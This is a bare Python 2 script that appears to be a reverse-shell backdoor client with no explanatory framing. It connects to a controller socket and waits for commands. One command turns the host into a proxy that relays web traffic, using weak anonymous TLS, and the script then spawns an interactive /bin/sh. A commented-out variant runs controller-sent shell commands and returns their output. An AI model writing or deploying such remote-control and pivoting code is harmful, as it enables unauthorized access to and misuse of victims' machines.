#!/usr/bin/env python



import socket,subprocess,ssl
HOST = "127.0.0.1"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,12345))
while 1:
    r = s.recv(1024)
    x = r.split(' ')
    if 'QUIT' in x[0]:
        s.close()
    elif 'PROXY' in x[0]:
        proxy_port = int(x[1])
        pserv1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        pserv1.connect((HOST,proxy_port))
        while 1:
            data = pserv1.recv(14336)
            dx = data.replace('\n',' ').replace('\r',' ').split(' ') 
            try:
                host, host_ip = dx[dx.index("Host:")+1].strip().split(':')
            except:
                try: 
                    host = dx[dx.index("Host:")+1].strip()
                    host_ip = 80
                except:
                    host = None
                    print "[!] no host\n"
                    print data + '\n'
            if host:
                host_ip = int(host_ip)
                pserv2 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                pserv2.settimeout(10)
                pserv2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                data2 = (host, host_ip)
                data2 = str(data2)
                print data2
                try:
                    if host_ip == 443:
                        pserv2 = ssl.wrap_socket(pserv2, ssl_version=ssl.PROTOCOL_TLSv1, \
                                                         ciphers="ADH-AES256-SHA")
                    pserv2.connect((host, host_ip))
                    try:
                        pserv2.send(data)
                        try:
                            data = (pserv2.recv(14336))
                        except Exception as e:
                            data2 += "333" + str(e)
                    except Exception as e:
                        data2 += "222" + str(e)
                except Exception as e:
                    data2 = "111" + str(e)
                print data2
                try:
                    data = (pserv2.recv(14336))
                    print "[!]" + data
                except Exception as e:
                    print "[?]" + str(e)
                pserv1.send(data)
                pserv2.close()

        pserv1.shutdown(1)
        pserv1.close()                
    s.send(r)
s.close()
p=subprocess.call(["/bin/sh","-i"])


"""

import socket, subprocess, os

def connect():
    global host
    global port
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 12345
    host = '127.0.0.1'
    try:
        s.connect((host,port))
    except Exception as e:
        print "[*] hmm..: %s\n" % str(e)
def receive():
    receive = s.recv(14336)
    if receive == 'quit':
        s.close()
    elif receive == 'shell':
        proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc2.stdout.read() + proc2.stderr.read()
        args = stdout_value
    elif receive.split(' ')[0] == 'proxy':
        print 'do proxy...'
    else:
        args = 'none'
    send(args)
def send(args):
    send = s.send(args)
    receive()
connect()
receive()
s.close()

"""
